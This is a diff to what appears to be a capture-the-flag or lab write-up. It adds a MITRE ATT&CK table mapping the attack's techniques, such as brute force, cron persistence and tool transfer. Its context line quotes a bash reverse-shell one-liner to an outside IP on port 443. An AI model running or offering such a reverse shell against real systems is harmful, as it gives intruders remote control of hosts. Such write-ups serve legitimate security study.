@@ -193,6 +193,25 @@ Answer: /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1’
 
 ---
 
-## Author
+# MITRE ATT&CK Mapping
 
-### RUTHRAN-SEC
+| ATT&CK Stage | Technique ID | Technique |
+| --- | --- | --- |
+| Reconnaissance | T1595.001, T1595.002 | Active Scanning, Vulnerability Scanning |
+| Resource Development | - | - |
+| Initial Access | T1190, T1110 | Exploit Public-Facing Application, Brute Force |
+| Execution | T1059.004 | Unix Shell |
+| Persistence | T1053.003 | Cron |
+| Privilege Escalation | - | - |
+| Defense Impairment | - | - |
+| Credential Access | T1110 | Brute Force |
+| Discovery | T1083 | File and Directory Discovery |
+| Lateral Movement | - | - |
+| Collection | - | - |
+| Command and Control | T1071.001, T1105 | Application Layer Protocol: Web Protocols, Ingress Tool Transfer |
+| Exfiltration | - | - |
+| Impact | - | - |
+
+### DONE BY
+
+#### RUTHRAN-SEC
